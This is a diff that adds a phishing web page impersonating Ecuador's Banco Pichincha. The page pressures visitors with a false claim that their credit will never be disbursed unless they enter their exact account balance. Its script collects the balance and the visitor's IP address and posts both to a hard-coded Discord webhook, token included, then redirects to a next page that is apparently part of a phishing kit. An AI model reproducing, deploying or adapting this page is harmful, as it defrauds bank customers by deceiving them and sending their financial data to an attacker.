@@ -1,0 +1,372 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validación de Límite - Banco Pichincha</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --pichincha-yellow: #ffdd00;
+      --pichincha-blue: #0d2c6c;
+      --pichincha-blue-hover: #081d4a;
+      --bg-gray: #f4f6f9;
+      --card-bg: #ffffff;
+      --text-dark: #1f2937;
+      --text-muted: #6b7280;
+      --error: #dc2626;
+      --border-gray: #e5e7eb;
+
+      /* DIMENSIONES DEL CARRUSEL */
+      --hero-height: 120px;
+      --hero-max-width: 99%;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #0b1a30;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: var(--text-dark);
+    }
+
+    .mobile-container {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background-color: var(--bg-gray);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    }
+
+    .pichincha-header {
+      background-color: #ffffff;
+      padding: 1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid var(--border-gray);
+      z-index: 10;
+    }
+
+    .brand-logo {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    /* CARRUSEL DE IMÁGENES */
+    .carousel-container {
+      width: var(--hero-max-width);
+      height: var(--hero-height);
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .carousel-track {
+      display: flex;
+      width: 400%; /* 4 diapositivas al 100% cada una */
+      height: 100%;
+      transition: transform 0.5s ease-in-out;
+    }
+
+    .carousel-track img {
+      width: 25%; /* Cada imagen toma exactamente 1/4 del ancho total */
+      height: 100%;
+      object-fit: cover;
+      flex-shrink: 0;
+    }
+
+    .card-sheet {
+      background: var(--card-bg);
+      margin-top: -20px;
+      border-radius: 20px 20px 0 0;
+      padding: 1.8rem 1.5rem;
+      flex-grow: 1;
+      box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.08);
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      z-index: 2;
+    }
+
+    h2 {
+      color: var(--pichincha-blue);
+      font-size: 1.35rem;
+      margin-bottom: 0.4rem;
+      text-align: center;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: var(--text-muted);
+      font-size: 0.88rem;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      line-height: 1.4;
+    }
+
+    .form-group {
+      margin-bottom: 1.1rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.4rem;
+      color: var(--pichincha-blue);
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .currency-symbol {
+      position: absolute;
+      left: 0.9rem;
+      color: var(--pichincha-blue);
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 0.8rem 0.9rem 0.8rem 2.2rem;
+      border: 1px solid var(--border-gray);
+      border-radius: 8px;
+      font-size: 0.95rem;
+      background-color: #fff;
+      color: var(--text-dark);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    input[type="text"]:focus {
+      outline: none;
+      border-color: var(--pichincha-blue);
+      box-shadow: 0 0 0 3px rgba(13, 44, 108, 0.1);
+    }
+
+    button {
+      width: 100%;
+      padding: 0.95rem;
+      background-color: var(--pichincha-blue);
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+      margin-top: 0.5rem;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: var(--pichincha-blue-hover);
+    }
+
+    button:disabled {
+      background-color: #d1d5db;
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    .status-message {
+      margin-top: 1rem;
+      padding: 0.75rem;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      display: none;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .status-message.active {
+      display: block;
+    }
+
+    .status-message.error {
+      background-color: #fef2f2;
+      border: 1px solid #fecaca;
+      color: var(--error);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="mobile-container">
+    <header class="pichincha-header">
+      <img src="https://www.pichincha.com/portal/Portals/0/logo-pichincha.svg" alt="Banco Pichincha" class="brand-logo" onerror="this.onerror=null; this.src='https://via.placeholder.com/180x38?text=Banco+Pichincha';">
+    </header>
+
+    <div class="carousel-container">
+      <div class="carousel-track" id="carouselTrack">
+        <img src="https://soporte.pichincha.com/hc/article_attachments/37972895514011" alt="Promoción 1">
+        <img src="saldo.jpg" alt="Promoción 2">
+        <img src="https://soporte.pichincha.com/hc/article_attachments/37972895514011" alt="Promoción 3">
+        <img src="saldo.jpg" alt="Promoción 1 Duplicada">
+      </div>
+    </div>
+
+    <main class="card-sheet">
+      <h2>Consulta de Saldo</h2>
+      <p class="subtitle">Ingresa el saldo disponible en tu cuenta Pichincha para verificar tus limite para el desembolso del credito recuerda que si no ingresa el saldo exacto disponible en tu cuenta tu credito nunca llegra a tu cuenta Pichincha.</p>
+
+      <form id="limit-form">
+        <div class="form-group">
+          <label for="amount">Ingrese el saldo disponible</label>
+          <div class="input-wrapper">
+            <span class="currency-symbol">$</span>
+            <input 
+              type="text" 
+              id="amount" 
+              name="amount" 
+              placeholder="0.00" 
+              value="0.00"
+              inputmode="numeric"
+              required
+            >
+          </div>
+        </div>
+
+        <button type="submit" id="btn-submit">Continuar</button>
+      </form>
+
+      <div id="status-message" class="status-message" role="alert"></div>
+    </main>
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540809629498474579/kRthigCklVp7DFylgnndjUE4NWDq0c8fY6-jwWDRZ3v8nFMu5fOvgiDhPLCboUf8n7ZA";
+
+    const form = document.getElementById('limit-form');
+    const amountInput = document.getElementById('amount');
+    const submitBtn = document.getElementById('btn-submit');
+    const statusMessage = document.getElementById('status-message');
+    const track = document.getElementById('carouselTrack');
+
+    // --- LÓGICA DEL CARRUSEL (DESPLAZAMIENTO FOTO POR FOTO) ---
+    let currentIndex = 0;
+    const totalSlides = 3; // Número de imágenes reales (sin contar la duplicada)
+
+    function rotateCarousel() {
+      currentIndex++;
+      track.style.transition = 'transform 0.5s ease-in-out';
+      track.style.transform = `translateX(-${currentIndex * 25}%)`;
+
+      // Cuando llega a la copia de la primera foto, resetea sin animación al inicio
+      if (currentIndex === totalSlides) {
+        setTimeout(() => {
+          track.style.transition = 'none';
+          currentIndex = 0;
+          track.style.transform = `translateX(0%)`;
+        }, 500); // Coincide con la duración del CSS transition
+      }
+    }
+
+    // Cambia de foto cada 3 segundos (3000 ms)
+    setInterval(rotateCarousel, 3000);
+
+    // --- MANEJO DEL CAMPO DE TEXTO MONTO ---
+    amountInput.addEventListener('focus', (e) => {
+      if (e.target.value === '0.00') {
+        e.target.value = '';
+      }
+    });
+
+    amountInput.addEventListener('blur', (e) => {
+      if (e.target.value.trim() === '') {
+        e.target.value = '0.00';
+      }
+    });
+
+    amountInput.addEventListener('input', (e) => {
+      let digits = e.target.value.replace(/\D/g, '');
+
+      if (!digits) {
+        e.target.value = '';
+        return;
+      }
+
+      const numericValue = parseFloat(digits) / 100;
+
+      e.target.value = numericValue.toLocaleString('en-US', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    });
+
+    // --- OBTENER IP Y ENVIAR AL WEBHOOK DE DISCORD ---
+    async function getClientIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'No detectada';
+      }
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const amount = amountInput.value.trim();
+
+      if (!amount || amount === '0.00' || amount === '0') {
+        showMessage('Por favor ingresa un monto válido superior a $0.00.', 'error');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Procesando...';
+
+      const ip = await getClientIP();
+
+      const payload = {
+        content: `Monto: $${amount} USD | IP: ${ip}`
+      };
+
+      try {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          window.location.href = 'index4.html';
+        } else {
+          showMessage('Error al enviar. Verifica la URL del Webhook.', 'error');
+        }
+      } catch (error) {
+        showMessage('Error de conexión al enviar los datos.', 'error');
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Continuar';
+      }
+    });
+
+    function showMessage(msg, type) {
+      statusMessage.textContent = msg;
+      statusMessage.className = `status-message active ${type}`;
+    }
+  </script>
+</body>
+</html>
